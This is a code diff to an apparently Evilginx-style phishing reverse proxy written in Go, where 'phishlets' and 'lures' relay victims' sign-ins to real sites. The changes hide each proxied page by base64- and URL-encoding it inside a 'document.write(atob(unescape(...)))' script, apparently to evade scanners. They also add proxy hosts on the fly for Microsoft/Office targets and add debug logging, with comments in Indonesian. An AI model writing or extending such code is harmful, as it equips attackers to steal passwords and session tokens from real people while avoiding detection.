@@ -410,6 +410,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
+											log.Warning("body: \n", body)
 											body = p.replaceHtmlParams(body, lure_url, &s.Params)
 											//log.Warning(body)
 											// START LANDING LURES
@@ -887,6 +888,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
+
 			log.Warning("modify received body")
 			//log.Warning(string(body))
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
@@ -1003,6 +1005,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 								re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))
+
+								body = []byte(base64.StdEncoding.EncodeToString([]byte(string(body))))
+								body = []byte(url.QueryEscape(string(body)))
+								body = []byte(fmt.Sprintf("<script>document.write(atob(unescape('%s')))</script>", body))
+
 							}
 						}
 					}
@@ -1321,6 +1328,7 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 
 func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {
 	log.Warning("replaceHtmlParams: ")
+
 	// generate forwarder parameter
 	t := make([]byte, 5)
 	rand.Read(t[1:])
@@ -1597,6 +1605,10 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 		log.Warning("PHISHDOMAIN: %s", phishDomain)
 		var sub_map map[string]string = make(map[string]string)
 		var hosts []string
+
+		// COMMENTED FOR NON OFFICE
+		log.Warning("proxy_hosts: ", pl.proxyHosts)
+
 		for _, ph := range pl.proxyHosts {
 			var h string
 			if c_type == CONVERT_TO_ORIGINAL_URLS {
@@ -1608,12 +1620,18 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			}
 			hosts = append(hosts, h)
 		}
+
+		//END FOR COMMENTED
+
 		// make sure that we start replacing strings from longest to shortest
+
+		// THIS IS FOR OFFICE
 
 		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
 			u, err := url.Parse(s_url)
 			//log.Warning("body: %s", body)
 			log.Warning("s_url: %s", s_url)
+			//data := s_url
 			log.Warning("u HOST: %s", strings.ToLower(u.Host))
 			myString := string(body[:])
 
@@ -1681,6 +1699,9 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			}
 			return s_url
 		}))
+
+		// END THIS IS FOR OFFICE
+
 		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
 			for _, h := range hosts {
 				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
@@ -2039,8 +2060,12 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 			}
 			// MICROSOFT
 			//|| strings.Contains(ph.domain, hostname)
+
 			for _, ph := range pl.proxyHosts {
 				if strings.Contains(hostname, ph.domain) {
+					log.Info("hostname and ph.domain")
+					log.Info(hostname, ph.domain)
+
 					if hostname == ph.domain {
 						continue
 					}
@@ -2050,21 +2075,81 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 					if strings.Contains(hostname, ".online") {
 						continue
 					}
-					parts := strings.Split(strings.ToLower(hostname), ".")
-					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					log.Warning("domain inside replaceHostWithPhished: %s", domain)
-					subdomain := parts[len(parts)-3]
-					log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
-					data := ProxyHost{
-						phish_subdomain: subdomain,
-						domain:          domain,
-						orig_subdomain:  subdomain,
-						is_landing:      false,
-						handle_session:  true,
-						auto_filter:     true,
+					if strings.Contains(hostname, ".bio") {
+						continue
 					}
-					//		log.Warning("data: %s", data)
-					pl.proxyHosts = append(pl.proxyHosts, data)
+					if strings.Contains(hostname, "fuck.com") {
+						continue
+					}
+
+					//for _, element := range pl.proxyHosts {
+					//	log.Warning("cek apakah sudah ada")
+					//	log.Warning(combineHost(element.orig_subdomain, element.domain))
+					//	log.Warning(strings.ToLower(hostname)
+					//	if combineHost(element.orig_subdomain, element.domain) == hostname {
+					//		log.Warning("ada")
+					//		//exists = true
+					//
+					//	} else {
+					//
+					//		log.Warning("Belum ada hostname di host ")
+					//		parts := strings.Split(strings.ToLower(hostname), ".")
+					//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+					//		log.Warning("domain inside replaceHostWithPhished: %s", domain)
+					//		subdomain := parts[len(parts)-3]
+					//		log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
+					//		data := ProxyHost{
+					//			phish_subdomain: subdomain,
+					//			domain:          domain,
+					//			orig_subdomain:  subdomain,
+					//			is_landing:      false,
+					//			handle_session:  true,
+					//			auto_filter:     true,
+					//		}
+					//		//		log.Warning("data: %s", data)
+					//		pl.proxyHosts = append(pl.proxyHosts, data)
+					//		log.Warning("Added New Host: ", pl.proxyHosts)
+					//
+					//	}
+					//}
+
+					exists := false
+					for _, element := range pl.proxyHosts {
+						log.Warning("cek apakah sudah ada")
+						log.Warning(combineHost(element.orig_subdomain, element.domain), hostname)
+						if combineHost(element.orig_subdomain, element.domain) == hostname {
+							exists = true
+							break
+						}
+					}
+
+					if exists {
+						log.Warning("sudah ada")
+					}
+
+					if !exists {
+						log.Warning("Belum ada hostname di host ")
+						parts := strings.Split(strings.ToLower(hostname), ".")
+						domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+						log.Warning("domain inside replaceHostWithPhished: %s", domain)
+						subdomain := parts[len(parts)-3]
+						log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
+						data := ProxyHost{
+							phish_subdomain: subdomain,
+							domain:          domain,
+							orig_subdomain:  subdomain,
+							is_landing:      false,
+							handle_session:  true,
+							auto_filter:     true,
+						}
+						//		log.Warning("data: %s", data)
+						pl.proxyHosts = append(pl.proxyHosts, data)
+						log.Warning("Added value\n: ", pl.proxyHosts)
+
+					} else {
+						log.Warning("Sudah ada hostname di host ")
+					}
+
 				}
 			}
 
